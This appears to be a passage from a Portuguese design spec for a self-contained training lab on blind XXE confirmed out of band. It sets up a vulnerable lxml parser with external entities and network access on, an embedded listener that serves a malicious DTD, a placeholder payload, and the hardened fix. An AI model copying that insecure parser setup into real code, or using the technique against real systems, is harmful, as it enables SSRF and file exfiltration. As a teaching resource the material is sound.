# datum in a second request), depending on what libxml2 reproduces (see probe item 2).
EVIL_DTD = b"..."  # Phase 2 fills this per the probe


# oob-listener: a dumb out-of-band sink. It logs every inbound request so the student can
# confirm, via `docker compose logs oob-listener`, that the PARSER reached out. Self-hosted,
# air-gapped analog of a public interaction server (e.g. Burp Collaborator). TRIPWIRE, not a
# target: it holds no secret and is reachable ONLY from inside the Docker network (no host port).
# Reaching it at all is the whole proof.
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def catch(path):
    app.logger.info("OOB HIT path=/%s from=%s", path, request.remote_addr)
    if path.endswith(".dtd"):
        return Response(EVIL_DTD, mimetype="application/xml-dtd")
    return "ok"


if __name__ == "__main__":
    app.run(host=os.environ.get("HOST", "127.0.0.1"), port=80)
```

**Notas de implementação (validar na Fase 2):**
- **`request.data` (bytes) de propósito:** `etree.fromstring` sobre bytes evita a armadilha *"Unicode strings with encoding declaration are not supported"* e é o realista (o corpo chega como bytes). (Se o mantenedor optar pelo molde HTML, trocar por `request.form["xml"].encode("utf-8")`.)
- **`except … : pass` + ack genérico:** engolir o erro de parse (como o `16` engole a exceção do fetch) mantém a resposta **byte-idêntica** vulnerable↔fixed e **cega** (surfacear o erro seria um oráculo in-band que de-blinda). **Confirmar na Fase 2** que os dois lados devolvem exatamente `{"status": "received"}` para o payload.
- **A forma exata do parse/config é probe (item 1):** o bloco acima é candidato. Se o Candidato A (parameter entity → DTD externa) não reproduzir com a versão pinada, usar o Candidato B (entidade geral `http://`), ou a config que reproduzir — **documentar honestamente qual**.
- **Sem `huge_tree=True`** (mantém a proteção default do `lxml` contra billion-laughs — ver "Renderização / um átomo = uma vuln").

---

## O fix e o tipo de diff

**Fix:** **desligar external entities/DTD no parser** (`resolve_entities=False, load_dtd=False`), com `no_network=True` de reforço. Tipo de diff: **lógica-diferente no ponto de configurar/instanciar o parser** (parser inseguro → parser seguro). Diff no `XMLParser(...)`. O resto (`import_batch`, o `try/except`, o `return jsonify(...)`, imports, o listener) é **byte-idêntico** entre `vulnerable` e `fixed`.

Diff colável (candidato — a Fase 2 gera o real conforme o probe):

```diff
 @app.route("/import", methods=["POST"])
 def import_batch():
     xml = request.data
-    # VULNERABLE: parser RESOLVES EXTERNAL ENTITIES/DTD and reaches the NETWORK (no_network=False)...
-    parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=False)  # dangerous
+    # FIXED: external-entity resolution and DTD loading DISABLED, network off...
+    parser = etree.XMLParser(resolve_entities=False, load_dtd=False, no_network=True)  # hardened
     try:
         etree.fromstring(xml, parser)
     except etree.XMLSyntaxError:
         pass
     return jsonify(status="received")
```

**O CONTRASTE é o diff:** parser-que-resolve-entidade-externa-e-alcança-a-rede (vulnerable) vs parser-com-entidade/DTD-desligados (fixed). **A única mudança é a config do parser.** Note a linha que **NÃO muda:** `return jsonify(status="received")` — a resposta é a mesma nos dois.

### Notas obrigatórias no `DIFF.md` (CURTAS, didáticas)

1. **A causa é o PARSER, não a resposta.** O bug é o parser **resolver external entities/DTD** (e alcançar a rede) em XML não-confiável — **não** "a app devolveu o valor" (ela não devolve). Desligar external entities/DTD neutraliza porque o parser **nunca busca nada externo** → nenhum callback.
2. **"ESCONDER O ECO / NÃO DEVOLVER O VALOR" NÃO É O FIX — nota-ADVERTÊNCIA "mencionável, não aplicada".** Nomear a intuição (o reflexo de quem viu o `18`: *"o problema era o valor voltar na resposta, então é só não devolver"*), mostrar que isso **NÃO protege** — a vuln **não depende de eco**; a app **já** é cega e continua vulnerável; o parser segue resolvendo entidades e telefonando pra fora. **Cravar:** o fix é no **PARSER**, não na resposta. **(Este é o ponto que separa o `30` do `18` conceitualmente.)**
3. **Contraste com o `18` (a tabela).** Mesma causa, mesmo fix, **canal diferente** (in-band → out-of-band). "Um átomo = uma vuln" é a causa; o objeto de estudo é a confirmação OOB.
4. **Nota de infra: o listener é do lab, ortogonal à vuln.** Explicar **por que** o `oob-listener` é embarcado (Collaborator/`interactsh` são externos e indisponíveis num lab isolado; o átomo entrega o análogo self-hosted) — **mesma disciplina honesta do `16`**. O listener é **higiene de infra idêntica/compartilhada**, **não** o objeto de estudo.
5. **`defusedxml` — mencionável, não aplicada.** Como no `18`: o suporte a `lxml` no `defusedxml` está **deprecado**; a defesa atual pra app `lxml` é **endurecer o parser** (o fix deste átomo). Descrito, não aplicado.

---

## Wiring do listener / topologia — molde EXATO do `16`

Herdar a topologia do `16` (não inventar): `vulnerable` → rede `lab-vulnerable`; `fixed` → rede `lab-fixed`; **`oob-listener` → AMBAS** (`lab-vulnerable` **e** `lab-fixed`). Só `vulnerable`/`fixed` publicam porta no host (`8030`/`8130`, bind `127.0.0.1`); o `oob-listener` **não** publica porta.

**Por que o listener nas DUAS redes (a parte não-óbvia, herdada do `16`):** é a mesma isolação (vulnerable e fixed **não se enxergam**; ambos enxergam o listener) **E** é a construção **HONESTA** do contraste do fixed. Se o listener só estivesse em `lab-vulnerable`, a **ausência de hit** no fixed seria confundida com **inalcançabilidade de rede**. Pondo o listener **também** em `lab-fixed`, o fixed **CONSEGUE** alcançar o listener pela rede, mas o **parser endurecido nunca dispara a requisição** — então a ausência de hit é atribuível ao **CÓDIGO (o parser)**, não à topologia.

Esboço do `docker-compose.yml` (candidato — molde do `16`; a Fase 2 gera o real):

```yaml
services:
  vulnerable:
    build: ./vulnerable
    ports:
      - "127.0.0.1:8030:5000"
    networks:
      - lab-vulnerable
  fixed:
    build: ./fixed
    ports:
      - "127.0.0.1:8130:5000"
    networks:
      - lab-fixed
  oob-listener:
    build: ./oob-listener
    networks:
      - lab-vulnerable
      - lab-fixed

networks:
  lab-vulnerable:
  lab-fixed:
```

**Confirmar na Fase 2 (seguindo o `16`):** vulnerable e fixed **compartilham um único** `oob-listener` (não um por lado) — o `from=<ip>` no log distingue de qual container veio o hit. (O `16` faz assim; manter.)

---

## Biblioteca / stack

- **`vulnerable/requirements.txt` e `fixed/requirements.txt` (idênticos):**

```
Flask==3.0.0
lxml==<pin — candidato 5.3.0>
```

- **`oob-listener/requirements.txt` (molde do `16` — só Flask):**

```
Flask==3.0.0
```

- **`os`, `logging` são stdlib** (não vão no `requirements`).
- **`lxml` é behavior-critical (pin, como o `18`/os JWT).** O **comportamento de resolução de entidade/rede do `lxml` É o objeto de estudo** — então a versão é **behavior-critical** (`CLAUDE.md` §8.7). **Fixar a versão exata na Fase 2 e confirmar RODANDO** que ela dispara o OOB (probe item 1). Candidato `5.3.0` (o mesmo do `18`) — mas **o `18` roda com `no_network=True`**; o `30` precisa de `no_network=False` **e** de a versão **buscar a DTD externa/resolver a parameter entity** — isso é **o que o probe confirma**. Se o `5.3.0` não reproduzir, usar a versão que reproduz e documentar. `lxml` instala como **wheel manylinux** no `python:3.11-slim` **sem toolchain** (memória `rsa-atoms-crypto-wheel` / o install do `18`).
- **SEM `defusedxml`** (deprecado pra lxml — DIFF nota #5). **SEM** banco, `requests`, ou 2ª dependência nas apps. O listener **não** faz request outbound (só serve/loga) — só Flask.

---

## O container (candidatos; a Fase 2 gera o real)

**`vulnerable/Dockerfile` e `fixed/Dockerfile`** (idênticos entre si; molde do `16`/`18`; **com** a linha do `secret.txt` dummy **condicional ao teto de exfil** — item 2 do probe):

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
# Plant a DUMMY, single-line, URL-safe app secret so that IF OOB file exfil reproduces (probe
# item 2), the parser has an app-owned file to carry in the callback URL. Obviously fake,
# lab-only (CLAUDE.md §8). Planted in BOTH images so a fixed-side no-leak is the PARSER, not a
# missing file. If only the fetch (floor) reproduces, this file is harmless/unused.
RUN printf 'FLAG-xxe30-9f1c2a-EXAMPLE-not-a-real-secret\n' > /app/secret.txt
# Override default host (127.0.0.1) so Docker's port forwarding can reach Flask.
# Host-side exposure is still restricted to 127.0.0.1 by docker-compose.yml.
ENV HOST=0.0.0.0
EXPOSE 5000
CMD ["python", "-u", "app.py"]
```

**`oob-listener/Dockerfile`** (molde do `16` — **sem** `COPY templates`, `EXPOSE 80`, **sem** porta no host):

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY app.py .
# Override default host (127.0.0.1) so other containers on the Docker network can reach Flask.
# This service is never published to the host (no ports: in docker-compose.yml).
ENV HOST=0.0.0.0
EXPOSE 80
CMD ["python", "-u", "app.py"]
```

- **Sem `apt`, sem banco.** Só Flask + `lxml` (apps) / Flask (listener) via pip.
- **`/app/secret.txt` é condicional (só relevante se o teto de exfil reproduzir).** Se só o piso, deixar mesmo assim (inócuo) ou omitir — decisão de Fase 2 conforme o probe.

---

## WALKTHROUGH — abertura seca; Burp-only; headers PT traduzidos

Trilha **Burp (Repeater) + `docker compose logs`**. Payloads/responses/logs são **placeholders** da execução real capturada na Fase 2. **Abertura seca** (§5) — a 1ª frase situa a feature e a falha, **sem** encenação. Beats:

> **Abertura (seca).** *Um endpoint recebe um documento XML, parseia, e responde um ack genérico — a mesma resposta pra qualquer XML. Essa resposta muda esconde uma coisa: o parser resolve entidades externas. Um documento cujo DOCTYPE aponta uma entidade pra um servidor que você controla faz o parser telefonar pra lá — e o telefonema, não a resposta, é a prova.*

1. **Context.** Definir **XML, DTD, entidade, entidade externa (`SYSTEM`), parameter entity, in-band vs out-of-band/OOB, o listener OOB**. A feature: `POST /import` recebe XML, parseia, devolve `{"status": "received"}`. Categoria: **A05 — Security Misconfiguration** (sem arqueologia). Trilha: Burp + `docker compose logs`. Explicar o **lab de 3 containers** (vulnerable/fixed/oob-listener) e **por que** o listener é embarcado (análogo self-hosted do Collaborator; lab isolado).
2. **Spot the bug.** Mostrar o trecho do `vulnerable/app.py`: `request.data` flui pro `etree.fromstring(..., parser)` com um parser que **resolve entidade externa** e **alcança a rede** (`no_network=False`). Perguntas de auditoria: *"o parser resolve entidades que EU declaro?"* → sim; *"posso ler o resultado na resposta?"* → **não** (a resposta é muda) — por isso **blind**. Foreshadow do fix: **desligar external entities/DTD no parser**.
3. **Exploitation (o núcleo — VALIDAR RODANDO):**
   - **3a — baseline / ver o canal MUDO (OBRIGATÓRIO):** `POST /import` com um **XML benigno** → `{"status": "received"}`, **nenhum hit** no listener. **Cravar que a resposta é muda** — o in-band não diz nada. *(Este passo justifica o átomo existir separado do `18`; se o aluno não vir o in-band mudo, o OOB não faz sentido.)*
   - **3b — disparar o payload:** `POST /import` com o **XML-payload** (parameter entity → DTD no `oob-listener`, path `/proof-xxe-30.dtd`). A resposta **continua muda** (idêntica à 3a) — Burp não mostra **nada**.
   - **3c — confirmar OOB (a prova):** `docker compose logs oob-listener` → **`OOB HIT path=/proof-xxe-30.dtd from=<ip>`**. **XXE confirmado out-of-band.** O `from=<ip>` é o container `vulnerable`. *(Se o teto de exfil reproduzir — probe item 2 — mostrar também o 2º hit carregando o dado; senão, o hit da DTD é a prova, honestamente enquadrada.)*
4. **What the vuln is NOT (passo de contraste — §5, obrigatório).** Ver "Beat 'o que a vuln NÃO é'".
5. **Impact (honesto).** Ver "Impacto honesto".
6. **Why the fix works (porta 8130).** Repetir 3b contra o `fixed` → **mesma resposta muda** (`{"status": "received"}`, byte-idêntica), **MAS** `docker compose logs oob-listener` **NÃO** mostra hit novo do container fixed. **Prova-chave:** a resposta é igual nos dois; a **única** diferença observável é o **callback que não acontece**. A lição do diff: o fix **desliga external entities/DTD no parser** (não esconde o eco — nota #2); **contraste com o `18`** (nota #3); **listener é infra do lab** (nota #4); **`defusedxml` mencionável** (nota #5). **Sem** seção de exercícios/variações (`CLAUDE.md` §5). **Headers PT traduzidos.**

---

## Beat "o que a vuln NÃO é" (obrigatório — `CLAUDE.md` §5)

Isola a causa e desmonta os mal-entendidos vizinhos:

- **(a) NÃO é "esconder/remover o eco".** A app **já** não ecoa, e **mesmo assim** é vulnerável — a vuln **não depende de eco**. O fix é no **parser**, não na resposta. *(É o ponto conceitual central — sub-lição crítica.)*
- **(b) NÃO é o `18` (XXE in-band).** **Mesma causa** (parser resolve external entities/DTD) e **mesmo fix** (desligar). O que muda é **o canal**: sem eco → OOB. Não é uma vuln nova; é o **mesmo XXE sem canal direto**.
- **(c) NÃO é RCE.** É **resolução de entidade externa confirmada OOB** (o parser telefona pra fora / lê recurso conforme o probe). Sem execução de código.
- **(d) NÃO é "SSRF da app" (nem o `16`).** Quem faz a requisição é o **parser XML** resolvendo a entidade — **não** a app chamando `requests.get`. A **cara** é de SSRF (requisição de saída), mas a **classe** é XXE e o **fix** é o de XXE (A05, não A10).
- **Prova de isolamento:** um **XML benigno** (sem entidade externa) passa pelos **dois** lados **sem gerar hit**; **só** o XML-payload, no **vulnerable**, faz o listener registrar o hit — e no **fixed** nem ele. **A diferença é 100% o parser, não a app nem a resposta.**

---

## Impacto honesto

**XXE cego confirmado out-of-band.** O **piso** (travado): prova de que o parser **resolve entidades externas** e **faz requisições de saída** pra destinos que o atacante escolhe (o callback OOB) — na forma, uma **SSRF via XXE** confirmada. O **teto** é **o que o probe confirmar** (item 2): leitura de recurso interno / exfiltração OOB de conteúdo de arquivo **conforme a técnica reproduzir** com a versão pinada do `libxml2`. **Sem overclaim:** **NÃO** afirmar exfil de arquivo inteiro se o probe não confirmar; **NÃO** é RCE. A classe XXE **tem outras faces** — enunciar **conceitualmente**, **sem** nomear átomo/variante futura (foreshadow). O listener é **tripwire, não prêmio** (molde do `16`).

---

## Contraste com o repo / escopo — e a POLÍTICA DE FORESHADOW (redobrada)

**Referências a átomos publicados são bem-vindas** (`CLAUDE.md` §5):

- **`18 xxe-basic`** — o **gêmeo in-band**: mesma causa/fix, canal diferente (a tabela é a espinha do átomo). O aluno abre e compara.
- **`16 ssrf-blind-oob`** — o **molde de infra OOB**: mesma família de confirmação (OOB + listener embarcado), vetor diferente (SSRF vs XXE).
- **`01 sqli-union-basic`** — molde canônico de doc, se útil.

**POLÍTICA DE FORESHADOW (crítico — redobrada, `CLAUDE.md` §5):**

- **ZERO referência pra frente.** **PROIBIDO** citar/antecipar **qualquer** átomo/categoria/variante futura por número, nome **ou** descrição. Manter a proibição **GENÉRICA** — **sem nomear átomos não publicados**.
- **ZERO posicionamento de encerramento.** **PROIBIDO** "último átomo", "fecha/conclui a fase", "próxima fase", "penúltimo/último", **qualquer release/versão** (`v0.x`), ou texto que situe o átomo como **encerramento**. **A posição vive SÓ no `ROADMAP.md`.** O átomo se descreve **ISOLADO**.
- Que XXE tenha "outras faces" (escalada, leitura de recurso, exfil) é **descrição legítima da classe** — **sem** descrever nada como "um próximo passo/átomo". Na dúvida, mandar o aluno aprofundar na **PortSwigger Academy**.

**LIMITE DE ESCOPO:** o átomo vai até a **confirmação OOB do XXE cego** (o hit; e, se o probe permitir, a exfil de um dado controlado). A única superfície é o parser resolvendo entidade externa.

---

## Theory primer

`CLAUDE.md` §5 exige um bloco de Theory primer linkando pra **PortSwigger Web Security Academy**, na página **conceitual** da vuln ("what is X?"), **não** a listagem de labs. **Confirmar a URL por fetch na Fase 2 — NÃO inventar** (se não confirmar, perguntar ao mantenedor).

- **Candidato:** **`https://portswigger.net/web-security/xxe`** — a página-classe de XXE (título **"XML external entity (XXE) injection"**), a **mesma** que o `18` usa; ela **cobre a variante Blind XXE** numa seção. **Se a seção blind tiver âncora estável** (candidato a confirmar por fetch: `#blind-xxe` ou similar), **linkar direto nela**; senão, a página-classe.
- **Texto do link:** preservar o nome em **inglês** também no README PT (`CLAUDE.md` §7 — a forma que a PortSwigger usa na página).
- Formato do bloco: o padrão do `CLAUDE.md` §5 (o mesmo do `01`/`18`).

---

## Renderização / "um átomo = uma vuln"

A **ÚNICA** falha é o **parser resolver external entities/DTD** (e alcançar a rede) em XML não-confiável. A **resposta muda** (sem eco) e o **listener OOB** são **ortogonais** (compõem o cenário cego + o canal de prova, não são a vuln). Garantir (validar na Fase 2):

- **A resposta muda NÃO é o fix.** O fixed desliga external entities/DTD no **PARSER**, **NÃO** "esconde o eco" (que já está escondido) nem valida o XML por **blocklist** (a defesa-armadilha da nota #2 do DIFF). A **única** mudança é a config do parser.
- **Sem billion-laughs/entity-expansion DoS:** manter o default do `lxml` (`huge_tree=False`) — **NÃO** setar `huge_tree=True`. Validar que um payload de expansão **não** derruba o container.
- **API-only (recomendado):** sem template, sem render — **sem XSS possível** (não há eco de conteúdo). *(Se o mantenedor optar por HTML, o ack não ecoa conteúdo do XML — autoescape ligado, sem `|safe`; mas o recomendado é não ter HTML.)*
- **O `secret.txt` (se plantado) é dummy** (valor obviamente falso), condicional ao teto de exfil.
- **O listener é higiene de infra** idêntica/compartilhada (tripwire, sem segredo, interno-only), **não** o objeto de estudo.

---

## Decisões já tomadas, justificadas

| Decisão | Escolha | Justificativa |
|---|---|---|
| Categoria (pasta / Web Top 10) | **A05 — Security Misconfiguration** (`atoms/A05-security-misconfiguration/`, **já existe — reaproveita**) | ROADMAP lista `xxe-blind-oob` em A05, "Variante do 18". Pasta criada pelo `18`. Sem arqueologia. |
| Número / portas | **30 → `8030`/`8130`** (bind só `127.0.0.1`); listener **sem porta no host** | `CLAUDE.md` §5/§8. Base das portas e do commit/CHANGELOG. |
| Eixo | **Variante do `18` (XXE/A05), CEGA + OOB** | Mesma causa/fix; o canal (OOB) é o objeto de estudo. |
| Nome / classe | **Blind XXE (out-of-band)** | Paralelo ao H1 do `16`. Título = classe, sem stack. |
| Lição-coração | **Ausência de eco ≠ ausência de vuln; o parser telefona pra casa, o telefonema é a prova. Causa/fix = os do `18`; muda o canal.** | A vuln não depende de eco; a prova é o callback OOB. |
| Contraste central | **vs `18` (in-band → OOB)** — tabela obrigatória | É a razão de o átomo existir separado. |
| Molde de infra | **`16 ssrf-blind-oob`** (listener embarcado, 2 redes, log, sem porta no host) | Mesma família de confirmação OOB. |
| Topologia | **MULTI-CONTAINER** (vulnerable + fixed + `oob-listener`) | Cego precisa de canal OOB. Molde do `16`. |
| Flavor — **TRAVADO** (forma exata = Fase 2) | **Endpoint `POST` que parseia XML e responde ack mudo** (candidato: `POST /import`, bulk import, `{"status":"received"}`) | Parse não-confiável = a superfície; ack mudo materializa a cegueira. |
| Forma (HTML vs API) — **recomendado, confirmável** | **API-only JSON** (corpo XML cru); alternativa = molde HTML do `18` | Prova é o hit OOB (não render); XML cru no Repeater > form-encode do `18`. |
| Resposta vulnerable/fixed | **IDÊNTICA** (`{"status":"received"}`), cega | O fix endurece o parser, não a resposta (molde do `16`). |
| Parser vulnerable — **PROBE (item 1)** | **candidato `lxml` `XMLParser(resolve_entities=True, load_dtd=True, no_network=False)`** | Delta do `18` = `no_network=False` (alcança a rede). **Confirmar RODANDO**; version-dependent. |
| Payload — **PROBE (item 1)** | **A: parameter entity → DTD externa** (primário) / **B: entidade geral `http://`** (fallback) | A é o canônico blind XXE; B é fallback se `libxml2` restringir PE no subset interno. |
| O que a prova demonstra — **PROBE (item 2)** | **PISO travado: o HIT** / **TETO probe: exfil de dado controlado** | Hit = prova mínima sólida. Exfil de conteúdo tem limitações reais no `libxml2`; só se reproduzir. |
| Fix (único eixo) | **Desligar external entities/DTD no parser** (`resolve_entities=False, load_dtd=False`, `no_network=True`) | Defesa canônica de XXE em app lxml — **a mesma** do `18`. |
| Diff | **Lógica-diferente** — só a config do parser | Vulnerable × fixed diferem **só** no `XMLParser(...)`; resposta intocada. |
| `defusedxml` | **NÃO aplicar** (nota "mencionável, não aplicada") | Suporte a lxml deprecado; a defesa atual é endurecer o parser. Como no `18`. |
| Listener | **serve a DTD + loga `OOB HIT path=/... from=...`, retorna "ok", porta 80, interno-only** | Tripwire greppável; sem segredo; sem porta no host. Molde do `16`. |
| Wiring de rede | **`vulnerable`→`lab-vulnerable`; `fixed`→`lab-fixed`; `oob-listener`→AMBAS** | Molde do `16`. Ausência-de-hit no fixed atribuível ao CÓDIGO, não à rede. |
| `secret.txt` (condicional) | **dummy single-line URL-safe, nas 2 imagens** (só relevante se o teto reproduzir) | §8. Ausência no fixed = parser, não arquivo faltando. |
| Bibliotecas | **`Flask==3.0.0` + `lxml==<pin>`** (apps); **`Flask==3.0.0`** (listener) | `lxml` behavior-critical (pin, confirmar rodando). Sem defusedxml/banco/requests. |
| Impacto | **XXE cego confirmado OOB** (piso: SSRF-via-XXE/fetch; teto: exfil se reproduzir). NÃO RCE. | Honesto; sem overclaim; sem foreshadow. |
| Theory primer | **PortSwigger XXE** (`/web-security/xxe`, seção blind se âncora estável; confirmar por fetch) | Página conceitual "what is X?". Não inventar. Nome em inglês no PT. |
| Foreshadow | **ZERO pra frente + ZERO posicionamento de encerramento** (redobrado) | `CLAUDE.md` §5. Posição só no ROADMAP. Spec nasce limpa. |
| Abertura / trilha | **Abertura seca; Burp-only + `docker compose logs`** | `CLAUDE.md` §3.3/§5 atual. Sem trilha browser (não é client-side). |

---

## Riscos técnicos a validar na Fase 2 (checklist — NÃO validar agora)

Itens 1–7 são os centrais; 8–13 são higiene técnica / topologia. Todos são validação **na geração** (`CLAUDE.md` §11), não decisões pendentes.

1. **Baseline (canal in-band mudo):** `POST /import` (vuln) com um **XML normal** → resposta genérica (`{"status":"received"}`, `200`), **ZERO hit** no listener. Confirmar que a resposta **não revela nada** (é muda).
2. **A app NÃO ecoa:** confirmar que **nenhum** valor de entidade volta na resposta (nem em erro) — o canal in-band está **mudo** nos dois lados.
3. **O ATAQUE (central — VALIDAR RODANDO):** no **vulnerable**, `POST /import` com o **XML-payload** (parameter entity → `http://oob-listener/proof-xxe-30.dtd`) → a resposta **continua muda**, **MAS** `docker compose logs oob-listener` mostra **`OOB HIT path=/proof-xxe-30.dtd from=<vuln-ip>`**. **Capturar o hit real.** **Se não reproduzir, PARAR e avisar o mantenedor — NÃO inventar** logs/responses.
4. **FIXED (`8130`):** o **MESMO** payload → **mesma resposta muda** (byte-idêntica), **MAS** **NENHUM** hit novo do container fixed. **Capturar a AUSÊNCIA.**
5. **Parser/versão/config que dispara o OOB (PROBE item 1 — version-dependent):** confirmar RODANDO qual `lxml`/versão/config faz o parser **buscar a DTD externa / resolver a parameter entity** e disparar a requisição OOB (candidato `resolve_entities=True, load_dtd=True, no_network=False`; payload A ou B). **Pinar a versão.** Se a config canônica não reproduzir, **registrar honestamente e usar a que reproduz**. Se **NADA** reproduzir, **PARAR e avisar**.
6. **O que a prova demonstra (PROBE item 2):** o **HIT** é a prova sólida (piso, travado). A **exfil de conteúdo** só entra **se reproduzir** com a versão pinada (limitações do `libxml2`: newline/`>`/`&`/`%` quebram; PE aninhada é finicky). Se reproduzir com um dado **controlado single-line URL-safe**, mostrar; senão, provar pelo hit (e opcionalmente carregar um marcador). **NÃO overclamar exfil de arquivo inteiro.**
7. **Listener registra o hit determinístico e observável:** `OOB HIT path=/... from=...` aparece de fato em `docker compose logs oob-listener` (nível de log/`python -u`); a rota `.dtd` serve a DTD; catch-all loga tudo. Path **fixo** `/proof-xxe-30(.dtd)` (sem nonce).
8. **Uma vuln só:** a **única** superfície é o parse do XML não-confiável; a **resposta muda** e o **listener** são ortogonais. Sem billion-laughs (`huge_tree` no default `False`; validar que expansão não derruba o container). Sem XSS (API-only; ou, se HTML, ack não ecoa conteúdo + autoescape). Fix é **parser**, não blocklist de XML.
9. **§8 — lab offline, listener LOCAL, nada sai da máquina:** o callback OOB vai **só** pro `oob-listener` interno (`http://oob-listener/…`), **nunca** pra um host público. Binds **`127.0.0.1`** para `8030`/`8130`; listener **sem `ports:`**. **CRÍTICO:** o OOB **não** pode virar requisição pra internet.
10. **Fix corta o OOB:** com `resolve_entities=False, load_dtd=False`, a entidade externa **não** é resolvida, a DTD **não** é buscada → **sem hit**. Confirmar que a resposta do fixed é **byte-idêntica** à do vulnerable para o payload.
11. **`app.py` vulnerable × fixed:** confirmar por `diff` que a **única** mudança é a **config do parser** (`XMLParser(...)`), e que o resto (`import_batch`, `try/except`, `return jsonify(...)`, imports) e o `oob-listener` são **byte-idênticos**. Diff **lógica-diferente**.
12. **Topologia multi-container (molde do `16`):** três serviços; `oob-listener` nas **duas** redes, **sem** porta no host; só `vulnerable`/`fixed` publicam (`8030`/`8130`, `127.0.0.1`). **Um** listener compartilhado (o `from=<ip>` distingue). `./atom up xxe-blind-oob` sobe sem erro. **Validar via `docker exec` + `python http.client`/`curl` de dentro do container** se as portas host não forem alcançáveis do sandbox (memória `validating-atoms-via-docker-exec`; e o padrão OOB da memória `validating-csrf-cross-site-headless`/`datastore-atom-compose-pattern` para serviços auxiliares).
13. **Primer PortSwigger (XXE)** confirmado **por fetch** (`/web-security/xxe`, seção blind se âncora estável). Se em dúvida, perguntar ao mantenedor. **Não inventar.** `Flask==3.0.0`+`lxml==<pin>` instalam limpo (wheel) no `python:3.11-slim`.

**Bloqueante remanescente:** nenhum de decisão. **Pendências de Fase 2 (não bloqueantes agora):** reproduzir o ataque rodando (itens 1–4) e escolher o parser/config/payload que dispara o OOB (item 5); decidir piso vs teto conforme o probe (item 6); confirmar a URL do primer por fetch (item 13); gerar os arquivos e rodar o smoke test (`./atom up`).

---

## Notas específicas pro Claude Code

- **Princípio guia:** este átomo é a **variante cega/OOB do `18`**. Cada beat deve poder ser lido com o **`18` aberto ao lado** (o gêmeo in-band) e o **`16` aberto ao lado** (o molde de infra OOB). **Abrir e fechar** na lição-coração: *ausência de eco não é ausência de vulnerabilidade; a causa e o fix são os do `18`; o que muda é o canal — sem eco, confirma-se OOB.* E na sub-lição: *o fix é no PARSER, não na resposta.*
- **Leitura obrigatória antes de gerar (`CLAUDE.md` §10.5):** **`18 xxe-basic` INTEIRO** (a mecânica XXE, o parser/config, o payload de entidade, o fix, as notas do DIFF), **`16 ssrf-blind-oob` INTEIRO** (a infra OOB: listener, redes, log, resposta cega idêntica, a Saída B "por que o listener é embarcado"), `01 sqli-union-basic` (molde de doc), esta spec. Ler **não é pra copiar** — é pra **conformar** à convenção **atual** (Burp-only, abertura seca, sem arqueologia — **NÃO** replicar a trilha dupla nem a nota "era A4 em 2017" do `18`).
- **O PROBE é o coração técnico (itens 1/2/5/6):** o OOB do `lxml` é **version-dependent**. **Testar rodando**: o parser busca a DTD externa? A parameter entity resolve? O `no_network=False` é suficiente? **Liderar com o Candidato A** (parameter entity → DTD externa, o canônico); se `libxml2` restringir, cair pro **Candidato B** (entidade geral `http://`). **Piso = o hit; teto = exfil só se reproduzir.** **Se nada reproduzir, PARAR e avisar — NÃO inventar.**
- **A prova é o hit (não) aparecer no log (risco #3/#4).** Capturar a cadeia real: vulnerable → `OOB HIT path=/proof-xxe-30.dtd` no log; fixed → **sem** hit; resposta genérica **idêntica** nos dois. **Se não bater rodando, PARAR e avisar — NÃO inventar** logs/responses.
- **O passo pedagógico OBRIGATÓRIO:** o WALKTHROUGH **DEVE** fazer o aluno **VER PRIMEIRO** que a resposta é **muda** (não há eco) — **antes** de introduzir o OOB. Sem isso, o "pra que serve o OOB" não faz sentido, e o átomo perde a razão de existir separado do `18`.
- **Uma vuln só:** a **única** superfície é o parser resolvendo entidade externa; resposta muda + listener são **ortogonais**; sem billion-laughs (`huge_tree` default); `secret.txt` **dummy** (condicional); listener é **tripwire** (sem segredo, interno-only); o fix é **parser**, não blocklist. Sem RCE, sem XSS.
- **Impacto honesto:** **XXE cego confirmado OOB** (piso: o parser resolve entidade externa e faz requisição de saída — SSRF-via-XXE/fetch; teto: exfil **só se o probe confirmar**). **NÃO** RCE. **NÃO** afirmar exfil de arquivo inteiro sem confirmar. XXE "tem outras faces" só como **descrição da classe**, **sem** nomear átomo/variante futura.
- **`what the vuln is NOT` (obrigatório, §5):** isola que **o bug é a resolução de entidade do parser** — **não** "esconder o eco" (a app já não ecoa e é vulnerável), **não** o `18` in-band (mesma causa/fix, canal diferente), **não** RCE, **não** "SSRF da app". **Prova de isolamento:** um XML benigno passa nos dois lados **sem hit**; só o payload, no vulnerable, gera o hit.
- **Política de referência cross-átomo:** OK citar **`18`, `16`, `01`** (publicados) à vontade. **PROIBIDO** referenciar/foreshadowar qualquer átomo não-publicado/categoria/fase futura por número, nome **ou** descrição (proibição **GENÉRICA**, sem nomear). **PROIBIDO** situar o átomo como encerramento/último/próxima-fase ou anunciar release/versão. A posição vive **só** no `ROADMAP.md`.
- **Bilíngue PT+EN no mesmo commit** (README, WALKTHROUGH, DIFF). H1 **idêntico** em EN e PT (`xxe-blind-oob — Blind XXE (out-of-band)`, grafia confirmável na Fase 2). **Headers de seção traduzidos em TODA doc PT** (§7; única exceção o H1). Termos técnicos (XXE, XML, DTD, entity, external entity, parameter entity, `SYSTEM`, `file://`, in-band, out-of-band/OOB, blind, payload, parser, listener, sink, tripwire, callback, Collaborator) **não** se traduzem no PT.
- **Theory primer obrigatório** no topo do `README.md` e `README.pt-BR.md` (Fase 2): bloco PortSwigger (XXE), nome da página em inglês no PT. **Confirmar a URL por fetch na Fase 2** — não inventar.
- **CHANGELOG.md (Fase 2, NÃO agora):** em `[Unreleased] / Added`: `` Added atom 30: `xxe-blind-oob` — blind XXE confirmed out-of-band via an embedded listener; same parser-misconfiguration cause and fix as `xxe-basic`, different (out-of-band) channel (A05 Security Misconfiguration). `` (padrão das linhas dos átomos anteriores; **sem** foreshadow/posição).
- **ROADMAP.md:** marcar o átomo 30 como `[x]` **só na geração+validação** (proposta ao mantenedor, `CLAUDE.md` §10.4). **Não** alterar ROADMAP nesta fase de spec.
- **Validar manualmente na Fase 2** (`CLAUDE.md` §11): itens 1–13; reproduzir baseline (resposta muda, zero hit) → ataque (payload → hit no log) → contraste (o que a vuln NÃO é) → fixed (mesma resposta, **sem** hit). Validar via `docker exec` + `python http.client`/`curl` de dentro do container se as portas host não forem alcançáveis do sandbox.
